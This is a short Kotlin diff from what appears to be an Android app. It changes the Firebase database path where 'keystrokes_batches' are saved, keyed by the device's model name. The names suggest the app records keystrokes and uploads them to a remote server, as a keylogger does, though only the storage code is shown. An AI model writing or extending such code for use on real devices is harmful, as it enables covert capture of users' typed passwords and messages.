@@ -150,7 +150,7 @@ class MainActivity : Activity() {
                 val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
                 try {
                     val database = FirebaseDatabase.getInstance()
-                    val ref = database.getReference().child(deviceName).child("keystrokes_batches")
+                    val ref = database.getReference().child("keystrokes_batches").child(deviceName)
                     val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", Locale.getDefault()).format(Date())
                     val testData = mapOf(
                         "deviceName" to deviceName,
